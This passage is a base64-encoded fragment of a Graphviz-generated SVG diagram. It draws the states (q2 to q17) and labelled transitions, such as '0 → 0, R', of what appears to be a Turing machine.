mlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAwLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTkmIzQ1OyZndDtxMTAgLS0+CjxnIGlkPSJlZGdlMTkiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE5LSZndDtxMTA8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTkyLjAzLC03Mi42QzIxMi41MSwtNzMuNjUgMjQxLjI2LC03NS4xMyAyNjQuMTgsLTc2LjMyIi8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjI2My44OSwtNzkuODEgMjc0LjA1LC03Ni44MiAyNjQuMjUsLTcyLjgxIDI2My44OSwtNzkuODEiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMjMzLjc2IiB5PSItNzkuOTgiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHE5JiM0NTsmZ3Q7cTEwIC0tPgo8ZyBpZD0iZWRnZTIwIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xOS0mZ3Q7cTEwPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTE4Ni43NiwtNjAuMjdDMTkzLjg4LC01Ny4wOSAyMDIuMDMsLTU0LjA1IDIwOS44NCwtNTIuNDUgMjMwLjY3LC00OC4xOCAyMzcuMTYsLTQ2Ljg4IDI1Ny42OCwtNTIuNDUgMjYzLjMsLTUzLjk4IDI2OC45NCwtNTYuNDIgMjc0LjIyLC01OS4yMiIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIyNzIuMTIsLTYyLjA0IDI4Mi41MSwtNjQuMDkgMjc1LjY3LC01Ni4wMSAyNzIuMTIsLTYyLjA0Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjIzMy43NiIgeT0iLTU2LjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDEsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMyAtLT4KPGcgaWQ9Im5vZGU2IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMzwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSI0NDAuNTEiIGN5PSItMTM4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI0NDAuNTEiIHk9Ii0xMzQuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTM8L3RleHQ+CjwvZz4KPCEtLSBxMiYjNDU7Jmd0O3EzIC0tPgo8ZyBpZD0iZWRnZTUiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnEyLSZndDtxMzwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0zMjkuNjksLTE2MC4xOUMzNDguMjQsLTE2MC45NyAzNzMuNjUsLTE2MC43OSAzOTUuNTEsLTE1Ni4yNSAzOTkuNDMsLTE1NS40MyA0MDMuNDQsLTE1NC4yOCA0MDcuMzcsLTE1Mi45NSIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI0MDguNTgsLTE1Ni4yNCA0MTYuNjcsLTE0OS4zOSA0MDYuMDgsLTE0OS43IDQwOC41OCwtMTU2LjI0Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjM3MS41OSIgeT0iLTE2NC43NCIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAwLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTImIzQ1OyZndDtxMyAtLT4KPGcgaWQ9ImVkZ2U2IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMi0mZ3Q7cTM8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMzIyLjYsLTE0NS45MkMzMzAuMDksLTE0MS43MyAzMzguOTgsLTEzNy41NyAzNDcuNjgsLTEzNS40NSAzNjUuNTYsLTEzMS4wOSAzODUuOTcsLTEzMS4yMyA0MDMuMDEsLTEzMi43Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjQwMi4zNywtMTM2LjE1IDQxMi42OSwtMTMzLjczIDQwMy4xMSwtMTI5LjE5IDQwMi4zNywtMTM2LjE1Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjM3MS41OSIgeT0iLTEzOS42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTEwJiM0NTsmZ3Q7cTMgLS0+CjxnIGlkPSJlZGdlMjEiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExMC0mZ3Q7cTM8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMzI3LjYxLC04NS40NEMzNDYuNDYsLTkxLjQ1IDM3My4xOSwtMTAwLjc1IDM5NS41MSwtMTExLjQ1IDQwMC43MiwtMTEzLjk1IDQwNi4xMSwtMTE2Ljg5IDQxMS4yNCwtMTE5Ljg5Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjQwOS4wNSwtMTIyLjY2IDQxOS40MSwtMTI0Ljg2IDQxMi42OCwtMTE2LjY4IDQwOS4wNSwtMTIyLjY2Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjM3MS41OSIgeT0iLTExNS42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTExIC0tPgo8ZyBpZD0ibm9kZTE1IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMTE8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iNDQwLjUxIiBjeT0iLTU4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI0NDAuNTEiIHk9Ii01NC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMTE8L3RleHQ+CjwvZz4KPCEtLSBxMTAmIzQ1OyZndDtxMTEgLS0+CjxnIGlkPSJlZGdlMjIiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExMC0mZ3Q7cTExPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTMyNC42MSwtNjcuMzNDMzMxLjc0LC02NC4xNSAzMzkuODcsLTYxLjEgMzQ3LjY4LC01OS40NSAzNjUuNDIsLTU1LjY5IDM4NS41MywtNTUuMDQgNDAyLjQsLTU1LjQ3Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjQwMS44NCwtNTguOTUgNDExLjk3LC01NS44NiA0MDIuMTIsLTUxLjk2IDQwMS44NCwtNTguOTUiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMzcxLjU5IiB5PSItNjMuNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHE0IC0tPgo8ZyBpZD0ibm9kZTciIGNsYXNzPSJub2RlIj4KPHRpdGxlPnE0PC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjU3OC4zNSIgY3k9Ii0xNTguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjU3OC4zNSIgeT0iLTE1NC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xNDwvdGV4dD4KPC9nPgo8IS0tIHEzJiM0NTsmZ3Q7cTQgLS0+CjxnIGlkPSJlZGdlNyIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTMtJmd0O3E0PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTQ2Ny4zOCwtMTQyLjA2QzQ4OC4wNiwtMTQ1LjEgNTE3LjMxLC0xNDkuNDEgNTQwLjQ1LC0xNTIuODEiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNTM5LjY4LC0xNTYuMjQgNTUwLjA4LC0xNTQuMjMgNTQwLjcsLTE0OS4zMSA1MzkuNjgsLTE1Ni4yNCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI1MDkuNDMiIHk9Ii0xNTUuNDEiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMSwgUjwvdGV4dD4KPC9nPgo8IS0tIHExMiAtLT4KPGcgaWQ9Im5vZGU4IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMTI8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iNTc4LjM1IiBjeT0iLTc4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI1NzguMzUiIHk9Ii03NC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMTI8L3RleHQ+CjwvZz4KPCEtLSBxMyYjNDU7Jmd0O3ExMiAtLT4KPGcgaWQ9ImVkZ2U4IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMy0mZ3Q7cTEyPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTQ2My42NCwtMTI4LjQ3QzQ4NS42NCwtMTE4Ljc2IDUxOS42NSwtMTAzLjczIDU0NC43NSwtOTIuNjUiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNTQ2LjEyLC05NS44NyA1NTMuODUsLTg4LjYzIDU0My4yOSwtODkuNDcgNTQ2LjEyLC05NS44NyIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI1MDkuNDMiIHk9Ii0xMjEuMzMiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHE1IC0tPgo8ZyBpZD0ibm9kZTkiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnE1PC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjcxNi4xOSIgY3k9Ii0xMzguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjcxNi4xOSIgeT0iLTEzNC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xNTwvdGV4dD4KPC9nPgo8IS0tIHE0JiM0NTsmZ3Q7cTUgLS0+CjxnIGlkPSJlZGdlOSIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTQtJmd0O3E1PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTYwNS4zNywtMTYwLjE5QzYyMy45MSwtMTYwLjk3IDY0OS4zMywtMTYwLjc5IDY3MS4xOSwtMTU2LjI1IDY3NS4xMSwtMTU1LjQzIDY3OS4xMiwtMTU0LjI4IDY4My4wNSwtMTUyLjk1Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjY4NC4yNSwtMTU2LjI0IDY5Mi4zNCwtMTQ5LjM5IDY4MS43NSwtMTQ5LjcgNjg0LjI1LC0xNTYuMjQiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iNjQ3LjI3IiB5PSItMTY0Ljc0IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxNCYjNDU7Jmd0O3E1IC0tPgo8ZyBpZD0iZWRnZTEwIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xNC0mZ3Q7cTU8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNTk4LjI3LC0xNDUuOTJDNjA1Ljc3LC0xNDEuNzMgNjE0LjY2LC0xMzcuNTcgNjIzLjM1LC0xMzUuNDUgNjQxLjIzLC0xMzEuMDkgNjYxLjY1LC0xMzEuMjMgNjc4LjY5LC0xMzIuNyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSI2NzguMDUsLTEzNi4xNSA2ODguMzYsLTEzMy43MyA2NzguNzksLTEyOS4xOSA2NzguMDUsLTEzNi4xNSIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI2NDcuMjciIHk9Ii0xMzkuNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMSwgUjwvdGV4dD4KPC9nPgo8IS0tIHExMiYjNDU7Jmd0O3E1IC0tPgo8ZyBpZD0iZWRnZTI1IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xMTItJmd0O3E1PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTYwMy4yOCwtODUuNDRDNjIyLjE0LC05MS40NSA2NDguODcsLTEwMC43NSA2NzEuMTksLTExMS40NSA2NzYuNCwtMTEzLjk1IDY4MS43OCwtMTE2Ljg5IDY4Ni45MiwtMTE5Ljg5Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjY4NC43MiwtMTIyLjY2IDY5NS4wOSwtMTI0Ljg2IDY4OC4zNiwtMTE2LjY4IDY4NC43MiwtMTIyLjY2Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjY0Ny4yNyIgeT0iLTExNS42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4wIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTEzIC0tPgo8ZyBpZD0ibm9kZTE2IiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xMTM8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iNzE2LjE5IiBjeT0iLTU4LjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI3MTYuMTkiIHk9Ii01NC4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xMTM8L3RleHQ+CjwvZz4KPCEtLSBxMTImIzQ1OyZndDtxMTMgLS0+CjxnIGlkPSJlZGdlMjYiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnExMi0mZ3Q7cTEzPC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTYwMC4yOSwtNjcuMzNDNjA3LjQxLC02NC4xNSA2MTUuNTUsLTYxLjEgNjIzLjM1LC01OS40NSA2NDEuMSwtNTUuNjkgNjYxLjIsLTU1LjA0IDY3OC4wNywtNTUuNDciLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iNjc3LjUyLC01OC45NSA2ODcuNjUsLTU1Ljg2IDY3Ny44LC01MS45NiA2NzcuNTIsLTU4Ljk1Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjY0Ny4yNyIgeT0iLTYzLjY1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxNiAtLT4KPGcgaWQ9Im5vZGUxMCIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTY8L3RpdGxlPgo8ZWxsaXBzZSBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBjeD0iODU0LjAzIiBjeT0iLTExOC4yNSIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iODU0LjAzIiB5PSItMTE0LjA1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnE2PC90ZXh0Pgo8L2c+CjwhLS0gcTUmIzQ1OyZndDtxNiAtLT4KPGcgaWQ9ImVkZ2UxMSIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTUtJmd0O3E2PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTc0My4yMSwtMTQwLjE5Qzc2MS43NSwtMTQwLjk3IDc4Ny4xNywtMTQwLjc5IDgwOS4wMywtMTM2LjI1IDgxMi45NCwtMTM1LjQzIDgxNi45NSwtMTM0LjI4IDgyMC44OCwtMTMyLjk1Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjgyMi4wOSwtMTM2LjI0IDgzMC4xOCwtMTI5LjM5IDgxOS41OSwtMTI5LjcgODIyLjA5LC0xMzYuMjQiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iNzg1LjExIiB5PSItMTQ0Ljc0IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxNSYjNDU7Jmd0O3E2IC0tPgo8ZyBpZD0iZWRnZTEyIiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xNS0mZ3Q7cTY8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNNzM2LjExLC0xMjUuOTJDNzQzLjYsLTEyMS43MyA3NTIuNSwtMTE3LjU3IDc2MS4xOSwtMTE1LjQ1IDc3OS4wNywtMTExLjA5IDc5OS40OSwtMTExLjIzIDgxNi41MiwtMTEyLjciLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iODE1Ljg4LC0xMTYuMTUgODI2LjIsLTExMy43MyA4MTYuNjMsLTEwOS4xOSA4MTUuODgsLTExNi4xNSIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI3ODUuMTEiIHk9Ii0xMTkuNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MSDihpIgMSwgUjwvdGV4dD4KPC9nPgo8IS0tIHE3IC0tPgo8ZyBpZD0ibm9kZTExIiBjbGFzcz0ibm9kZSI+Cjx0aXRsZT5xNzwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSI5OTEuODciIGN5PSItOTguMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9Ijk5MS44NyIgeT0iLTk0LjA1IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPnE3PC90ZXh0Pgo8L2c+CjwhLS0gcTYmIzQ1OyZndDtxNyAtLT4KPGcgaWQ9ImVkZ2UxMyIgY2xhc3M9ImVkZ2UiPgo8dGl0bGU+cTYtJmd0O3E3PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTg4MS4wNCwtMTIwLjE5Qzg5OS41OSwtMTIwLjk3IDkyNS4wMSwtMTIwLjc5IDk0Ni44NywtMTE2LjI1IDk1MC43OCwtMTE1LjQzIDk1NC43OSwtMTE0LjI4IDk1OC43MiwtMTEyLjk1Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9Ijk1OS45MywtMTE2LjI0IDk2OC4wMiwtMTA5LjM5IDk1Ny40MywtMTA5LjcgOTU5LjkzLC0xMTYuMjQiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iOTIyLjk1IiB5PSItMTI0Ljc0IiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjAg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxNiYjNDU7Jmd0O3E3IC0tPgo8ZyBpZD0iZWRnZTE0IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xNi0mZ3Q7cTc8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNODczLjk1LC0xMDUuOTJDODgxLjQ0LC0xMDEuNzMgODkwLjMzLC05Ny41NyA4OTkuMDMsLTk1LjQ1IDkxNi45MSwtOTEuMDkgOTM3LjMzLC05MS4yMyA5NTQuMzYsLTkyLjciLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iOTUzLjcyLC05Ni4xNSA5NjQuMDQsLTkzLjczIDk1NC40NiwtODkuMTkgOTUzLjcyLC05Ni4xNSIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSI5MjIuOTUiIHk9Ii05OS42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTggLS0+CjxnIGlkPSJub2RlMTIiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnE4PC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjExMjkuNyIgY3k9Ii0xMjMuMjUiIHJ4PSIyNyIgcnk9IjE4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjExMjkuNyIgeT0iLTExOS4wNSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj5xODwvdGV4dD4KPC9nPgo8IS0tIHE3JiM0NTsmZ3Q7cTggLS0+CjxnIGlkPSJlZGdlMTUiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE3LSZndDtxODwvdGl0bGU+CjxwYXRoIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGQ9Ik0xMDE4LjQyLC0xMDIuOTVDMTAzOS4xOSwtMTA2Ljc3IDEwNjguNzcsLTExMi4yMiAxMDkyLjA3LC0xMTYuNTEiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTA5MS4zMSwtMTE5LjkyIDExMDEuNzgsLTExOC4yOSAxMDkyLjU4LC0xMTMuMDQgMTA5MS4zMSwtMTE5LjkyIi8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjEwNjAuNzgiIHk9Ii0xMTguNjUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMSwgUjwvdGV4dD4KPC9nPgo8IS0tIHExNiAtLT4KPGcgaWQ9Im5vZGUxMyIgY2xhc3M9Im5vZGUiPgo8dGl0bGU+cTE2PC90aXRsZT4KPGVsbGlwc2UgZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgY3g9IjExMjkuNyIgY3k9Ii0zNC4yNSIgcng9IjI3IiByeT0iMTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMTEyOS43IiB5PSItMzAuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTE2PC90ZXh0Pgo8L2c+CjwhLS0gcTcmIzQ1OyZndDtxMTYgLS0+CjxnIGlkPSJlZGdlMTYiIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE3LSZndDtxMTY8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTAxNC42OSwtODcuOTdDMTAzNi44NywtNzcuNTIgMTA3MS40NywtNjEuMjEgMTA5Ni43NCwtNDkuMzEiLz4KPHBvbHlnb24gZmlsbD0iYmxhY2siIHN0cm9rZT0iYmxhY2siIHBvaW50cz0iMTA5OC4wMSwtNTIuNTggMTEwNS41NiwtNDUuMTUgMTA5NS4wMywtNDYuMjUgMTA5OC4wMSwtNTIuNTgiLz4KPHRleHQgdGV4dC1hbmNob3I9Im1pZGRsZSIgeD0iMTA2MC43OCIgeT0iLTc5LjkyIiBmb250LWZhbWlseT0iVGltZXMsc2VyaWYiIGZvbnQtc2l6ZT0iMTQuMDAiPjEg4oaSIDAsIFI8L3RleHQ+CjwvZz4KPCEtLSBxMTcgLS0+CjxnIGlkPSJub2RlMTQiIGNsYXNzPSJub2RlIj4KPHRpdGxlPnExNzwvdGl0bGU+CjxlbGxpcHNlIGZpbGw9Im5vbmUiIHN0cm9rZT0iYmxhY2siIGN4PSIxMjY3LjU0IiBjeT0iLTgzLjI1IiByeD0iMjciIHJ5PSIxOCIvPgo8dGV4dCB0ZXh0LWFuY2hvcj0ibWlkZGxlIiB4PSIxMjY3LjU0IiB5PSItNzkuMDUiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+cTE3PC90ZXh0Pgo8L2c+CjwhLS0gcTgmIzQ1OyZndDtxMTcgLS0+CjxnIGlkPSJlZGdlMTciIGNsYXNzPSJlZGdlIj4KPHRpdGxlPnE4LSZndDtxMTc8L3RpdGxlPgo8cGF0aCBmaWxsPSJub25lIiBzdHJva2U9ImJsYWNrIiBkPSJNMTE1NS45NCwtMTE4LjI5QzExNzQuNTUsLTExNC4zOCAxMjAwLjM4LC0xMDguMzkgMTIyMi41NCwtMTAxLjI1IDEyMjYuMjcsLTEwMC4wNSAxMjMwLjEyLC05OC42NyAxMjMzLjkzLC05Ny4yMyIvPgo8cG9seWdvbiBmaWxsPSJibGFjayIgc3Ryb2tlPSJibGFjayIgcG9pbnRzPSIxMjM0Ljk5LC0xMDAuNTggMTI0MywtOTMuNjQgMTIzMi40MSwtOTQuMDcgMTIzNC45OSwtMTAwLjU4Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjExOTguNjIiIHk9Ii0xMTguMjEiIGZvbnQtZmFtaWx5PSJUaW1lcyxzZXJpZiIgZm9udC1zaXplPSIxNC4wMCI+MCDihpIgMCwgUjwvdGV4dD4KPC9nPgo8IS0tIHE4JiM0NTsmZ3Q7cTE3IC0tPgo8ZyBpZD0iZWRnZTE4IiBjbGFzcz0iZWRnZSI+Cjx0aXRsZT5xOC0mZ3Q7cTE3PC90aXRsZT4KPHBhdGggZmlsbD0ibm9uZSIgc3Ryb2tlPSJibGFjayIgZD0iTTExNDUuMTgsLTEwOC4wOEMxMTU2LjUzLC05Ni4zOSAxMTcxLC04MS45NSAxMTc0LjcsLTgwLjQ1IDExOTIuMjgsLTczLjMxIDEyMTMuMzUsLTczLjQxIDEyMzAuODcsLTc1LjU2Ii8+Cjxwb2x5Z29uIGZpbGw9ImJsYWNrIiBzdHJva2U9ImJsYWNrIiBwb2ludHM9IjEyMjkuODksLTc4Ljk1IDEyNDAuMzEsLTc2Ljk5IDEyMzAuOTQsLTcyLjAzIDEyMjkuODksLTc4Ljk1Ii8+Cjx0ZXh0IHRleHQtYW5jaG9yPSJtaWRkbGUiIHg9IjExOTguNjIiIHk9Ii04NC42NSIgZm9udC1mYW1pbHk9IlRpbWVzLHNlcmlmIiBmb250LXNpemU9IjE0LjAwIj4xIOKGkiAxLCBSPC90ZXh0Pgo8L2c+CjwhLS0gcTE2JiM0NTsmZ3